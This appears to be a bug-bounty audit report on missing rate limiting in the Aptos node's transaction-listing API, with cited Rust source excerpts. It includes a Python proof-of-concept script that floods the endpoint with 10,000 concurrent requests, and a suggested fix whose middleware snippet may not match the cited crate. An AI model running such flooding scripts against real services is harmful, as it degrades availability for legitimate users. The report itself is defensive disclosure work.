# Audit Report

## Title
API Rate Limiting Absence Enables Resource Exhaustion via Repeated Maximum-Limit Transaction Queries

## Summary
The `get_transactions()` API endpoint in `api/src/transactions.rs` lacks application-level rate limiting, allowing unprivileged attackers to repeatedly request the maximum page size (100 transactions) through concurrent requests, potentially causing API slowdowns and resource exhaustion.

## Finding Description

The API endpoint accepts transaction queries with a configurable limit parameter. The implementation caps individual requests at `max_transactions_page_size` (default 100), but provides no rate limiting to prevent an attacker from making thousands of concurrent requests. [1](#0-0) 

The limit enforcement occurs in the Page structure: [2](#0-1) 

The default maximum page size is configured as 100: [3](#0-2) 

Each request spawns a blocking task that reads transactions from storage: [4](#0-3) [5](#0-4) 

The storage layer performs disk I/O for each transaction: [6](#0-5) 

Critically, the API runtime configuration shows no rate limiting middleware: [7](#0-6) 

The API documentation claims rate limiting exists but it is not implemented: [8](#0-7) 

## Impact Explanation

This falls under **Low Severity** per the bug bounty criteria as a "non-critical implementation bug." While the documentation mentions "Validator node slowdowns" as High severity, this vulnerability has limited practical impact because:

1. Each request is capped at 100 transactions (relatively small)
2. HAProxy provides connection limits (maxconn 500, maxconnrate 300)
3. Tokio's thread pool provides natural backpressure
4. Storage reads from RocksDB are fast
5. Production deployments typically have external rate limiting (CDN, WAF)

However, the discrepancy between documented and actual behavior represents a security concern that could lead operators to incorrectly assume protection exists.

## Likelihood Explanation

**High likelihood** - The attack is trivial to execute:
- No authentication required for public API endpoints
- Simple HTTP GET requests from any client
- No rate limiting to prevent repeated requests
- Attack can be sustained with minimal resources

An attacker can easily script concurrent requests to exhaust API resources.

## Recommendation

Implement application-level rate limiting middleware in the API layer using the existing `aptos-rate-limiter` crate: [9](#0-8) 

Add rate limiting to the runtime configuration to match the documented behavior of "100 requests per minute":

```rust
// In api/src/runtime.rs, add rate limiting middleware
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;

// Add to the route configuration
.with(RateLimitMiddleware::new(100, Duration::from_secs(60)))
```

Update the API configuration to include rate limiting settings and ensure documentation matches implementation.

## Proof of Concept

```python
import concurrent.futures
import requests
import time

# Target API endpoint
BASE_URL = "http://localhost:8080/v1"

def make_request(offset):
    """Make a single transaction query requesting maximum limit"""
    try:
        response = requests.get(
            f"{BASE_URL}/transactions",
            params={"limit": 100, "start": offset * 100},
            timeout=30
        )
        return {
            "status": response.status_code,
            "time": response.elapsed.total_seconds(),
            "offset": offset
        }
    except Exception as e:
        return {"error": str(e), "offset": offset}

# Launch concurrent requests to exhaust API resources
print("Starting resource exhaustion attack...")
start_time = time.time()

with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
    # Submit 10,000 concurrent requests
    futures = [executor.submit(make_request, i) for i in range(10000)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

elapsed = time.time() - start_time

# Analyze results
successful = sum(1 for r in results if r.get("status") == 200)
failed = len(results) - successful
avg_time = sum(r.get("time", 0) for r in results if "time" in r) / len(results)

print(f"Attack completed in {elapsed:.2f} seconds")
print(f"Successful requests: {successful}")
print(f"Failed requests: {failed}")
print(f"Average response time: {avg_time:.3f}s")
print(f"Total transactions requested: {len(results) * 100}")
```

**Expected behavior:** Without rate limiting, the API will process all 10,000 requests, each fetching 100 transactions from storage (1,000,000 total transaction reads), causing significant API slowdown and potential timeout errors for legitimate users.

## Notes

While this vulnerability exists, its practical impact is mitigated by:
- Infrastructure-level protections (HAProxy connection limits)
- The 100-transaction per-request cap
- Fast RocksDB read performance
- Tokio's backpressure mechanisms

However, the absence of documented rate limiting represents a security gap that could be exploited to degrade API service quality.

### Citations

**File:** api/src/transactions.rs (L157-180)
```rust
    async fn get_transactions(
        &self,
        accept_type: AcceptType,
        /// Ledger version to start list of transactions
        ///
        /// If not provided, defaults to showing the latest transactions
        start: Query<Option<U64>>,
        /// Max number of transactions to retrieve.
        ///
        /// If not provided, defaults to default page size
        limit: Query<Option<u16>>,
    ) -> BasicResultWith404<Vec<Transaction>> {
        fail_point_poem("endpoint_get_transactions")?;
        self.context
            .check_api_output_enabled("Get transactions", &accept_type)?;
        let page = Page::new(
            start.0.map(|v| v.0),
            limit.0,
            self.context.max_transactions_page_size(),
        );

        let api = self.clone();
        api_spawn_blocking(move || api.list(&accept_type, page)).await
    }
```

**File:** api/src/transactions.rs (L854-891)
```rust
    fn list(&self, accept_type: &AcceptType, page: Page) -> BasicResultWith404<Vec<Transaction>> {
        let latest_ledger_info = self.context.get_latest_ledger_info()?;
        let ledger_version = latest_ledger_info.version();

        let limit = page.limit(&latest_ledger_info)?;
        let start_version = page.compute_start(limit, ledger_version, &latest_ledger_info)?;
        let data = self
            .context
            .get_transactions(start_version, limit, ledger_version)
            .context("Failed to read raw transactions from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &latest_ledger_info,
                )
            })?;

        match accept_type {
            AcceptType::Json => {
                let timestamp = self
                    .context
                    .get_block_timestamp(&latest_ledger_info, start_version)?;
                BasicResponse::try_from_json((
                    self.context.render_transactions_sequential(
                        &latest_ledger_info,
                        data,
                        timestamp,
                    )?,
                    &latest_ledger_info,
                    BasicResponseStatus::Ok,
                ))
            },
            AcceptType::Bcs => {
                BasicResponse::try_from_bcs((data, &latest_ledger_info, BasicResponseStatus::Ok))
            },
        }
    }
```

**File:** api/src/page.rs (L64-96)
```rust
    pub fn limit<E: BadRequestError>(&self, ledger_info: &LedgerInfo) -> Result<u16, E> {
        determine_limit(
            self.limit,
            DEFAULT_PAGE_SIZE,
            self.max_page_size,
            ledger_info,
        )
    }
}

pub fn determine_limit<E: BadRequestError>(
    // The limit requested by the user, if any.
    requested_limit: Option<u16>,
    // The default limit to use, if requested_limit is None.
    default_limit: u16,
    // The ceiling on the limit. If the requested value is higher than this, we just use this value.
    max_limit: u16,
    ledger_info: &LedgerInfo,
) -> Result<u16, E> {
    let limit = requested_limit.unwrap_or(default_limit);
    if limit == 0 {
        return Err(E::bad_request_with_code(
            format!("Given limit value ({}) must not be zero", limit),
            AptosErrorCode::InvalidInput,
            ledger_info,
        ));
    }
    // If we go over the max page size, we return the max page size
    if limit > max_limit {
        Ok(max_limit)
    } else {
        Ok(limit)
    }
```

**File:** config/src/config/api_config.rs (L99-131)
```rust
pub const DEFAULT_MAX_PAGE_SIZE: u16 = 100;
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
const DEFAULT_MAX_ACCOUNT_MODULES_PAGE_SIZE: u16 = 9999;
const DEFAULT_MAX_VIEW_GAS: u64 = 2_000_000; // We keep this value the same as the max number of gas allowed for one single transaction defined in aptos-gas.

fn default_enabled() -> bool {
    true
}

fn default_disabled() -> bool {
    false
}

impl Default for ApiConfig {
    fn default() -> ApiConfig {
        ApiConfig {
            enabled: default_enabled(),
            address: format!("{}:{}", DEFAULT_ADDRESS, DEFAULT_PORT)
                .parse()
                .unwrap(),
            tls_cert_path: None,
            tls_key_path: None,
            content_length_limit: None,
            failpoints_enabled: default_disabled(),
            bcs_output_enabled: default_enabled(),
            json_output_enabled: default_enabled(),
            compression_enabled: default_enabled(),
            encode_submission_enabled: default_enabled(),
            transaction_submission_enabled: default_enabled(),
            transaction_simulation_enabled: default_enabled(),
            max_submit_transaction_batch_size: DEFAULT_MAX_SUBMIT_TRANSACTION_BATCH_SIZE,
            max_block_transactions_page_size: *MAX_RECEIVING_BLOCK_TXNS as u16,
            max_transactions_page_size: DEFAULT_MAX_PAGE_SIZE,
```

**File:** api/src/context.rs (L831-877)
```rust
    pub fn get_transactions(
        &self,
        start_version: u64,
        limit: u16,
        ledger_version: u64,
    ) -> Result<Vec<TransactionOnChainData>> {
        let data = self
            .db
            .get_transaction_outputs(start_version, limit as u64, ledger_version)?
            .consume_output_list_with_proof();

        let txn_start_version = data
            .get_first_output_version()
            .ok_or_else(|| format_err!("no start version from database"))?;
        ensure!(
            txn_start_version == start_version,
            "invalid start version from database: {} != {}",
            txn_start_version,
            start_version
        );

        let infos = data.proof.transaction_infos;
        let transactions_and_outputs = data.transactions_and_outputs;

        ensure!(
            transactions_and_outputs.len() == infos.len(),
            "invalid data size from database: {}, {}",
            transactions_and_outputs.len(),
            infos.len(),
        );

        transactions_and_outputs
            .into_iter()
            .zip(infos)
            .enumerate()
            .map(
                |(i, ((txn, txn_output), info))| -> Result<TransactionOnChainData> {
                    let version = start_version + i as u64;
                    let (write_set, events, _, _, _) = txn_output.unpack();
                    let h = self.get_accumulator_root_hash(version)?;
                    let txn: TransactionOnChainData =
                        (version, txn, info, events, h, write_set).into();
                    Ok(self.maybe_translate_v2_to_v1_events(txn))
                },
            )
            .collect()
    }
```

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L267-326)
```rust
    fn get_transactions(
        &self,
        start_version: Version,
        limit: u64,
        ledger_version: Version,
        fetch_events: bool,
    ) -> Result<TransactionListWithProofV2> {
        gauged_api("get_transactions", || {
            error_if_too_many_requested(limit, MAX_REQUEST_LIMIT)?;

            if start_version > ledger_version || limit == 0 {
                return Ok(TransactionListWithProofV2::new_empty());
            }
            self.error_if_ledger_pruned("Transaction", start_version)?;

            let limit = std::cmp::min(limit, ledger_version - start_version + 1);

            let txns = (start_version..start_version + limit)
                .map(|version| self.ledger_db.transaction_db().get_transaction(version))
                .collect::<Result<Vec<_>>>()?;
            let txn_infos = (start_version..start_version + limit)
                .map(|version| {
                    self.ledger_db
                        .transaction_info_db()
                        .get_transaction_info(version)
                })
                .collect::<Result<Vec<_>>>()?;
            let events = if fetch_events {
                Some(
                    (start_version..start_version + limit)
                        .map(|version| self.ledger_db.event_db().get_events_by_version(version))
                        .collect::<Result<Vec<_>>>()?,
                )
            } else {
                None
            };
            let persisted_aux_info = (start_version..start_version + limit)
                .map(|version| {
                    Ok(self
                        .ledger_db
                        .persisted_auxiliary_info_db()
                        .get_persisted_auxiliary_info(version)?
                        .unwrap_or(PersistedAuxiliaryInfo::None))
                })
                .collect::<Result<Vec<_>>>()?;
            let proof = TransactionInfoListWithProof::new(
                self.ledger_db
                    .transaction_accumulator_db()
                    .get_transaction_range_proof(Some(start_version), limit, ledger_version)?,
                txn_infos,
            );

            Ok(TransactionListWithProofV2::new(
                TransactionListWithAuxiliaryInfos::new(
                    TransactionListWithProof::new(txns, events, Some(start_version), proof),
                    persisted_aux_info,
                ),
            ))
        })
    }
```

**File:** api/src/runtime.rs (L229-264)
```rust
    runtime_handle.spawn(async move {
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);

        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
        Server::new_with_acceptor(acceptor)
            .run(route)
            .await
            .map_err(anyhow::Error::msg)
    });
```

**File:** api/doc/README.md (L26-29)
```markdown
## Limitations
- Rate limiting: 100 requests per minute by default
- Maximum request size: 2MB
- Connection timeout: 30 seconds
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_infallible::{Mutex, RwLock};
use aptos_logger::debug;
use aptos_metrics_core::HistogramVec;
use std::{cmp::min, collections::HashMap, fmt::Debug, hash::Hash, sync::Arc, time::Instant};
use tokio::time::Duration;

pub type SharedBucket = Arc<Mutex<Bucket>>;

const ONE_SEC: Duration = Duration::from_secs(1);

/// A generic token bucket filter
///
/// # Terms
/// ## Key
/// A `key` is an identifier of the item being rate limited
///
/// ## Token
/// A `token` is the smallest discrete value that we want to rate limit by.  In a situation involving
/// network requests, this may represent a request or a byte.  `Tokens` are the counters for the
/// rate limiting, and when there are no `tokens` left in a `bucket`, the `key` is throttled.
///
/// ## Bucket
/// A `bucket` is the tracker of the number of `tokens`.  It has a `bucket size`, and any additional
/// tokens added to it will "spill" out of the `bucket`.  The `buckets` are filled at an `interval`
/// with a given `fill rate`.
///
/// ## Interval
/// The `interval` at which we refill *all* of the `buckets` in the token bucket filter. Configured
/// across the whole token bucket filter.
///
/// ## Fill Rate
/// The rate at which we fill a `bucket` with tokens. Configured per bucket.
///
/// ## Bucket Size
/// Maximum size of a bucket.  A bucket saturates at this size.  Configured per bucket.
///
/// # Features
/// ## Keys
/// The token bucket takes any key as long as it's hashable.  This should allow it to apply to
/// many applications that need rate limiters.
///
/// ## Bucket sizes and Rates
/// ### Defaults
/// There are defaults for bucket size and fill rate, which will apply to unknown keys.
///
/// ### Refill Interval
/// Buckets are refilled automatically at an interval.  To do this synchronously, it calculates the
```
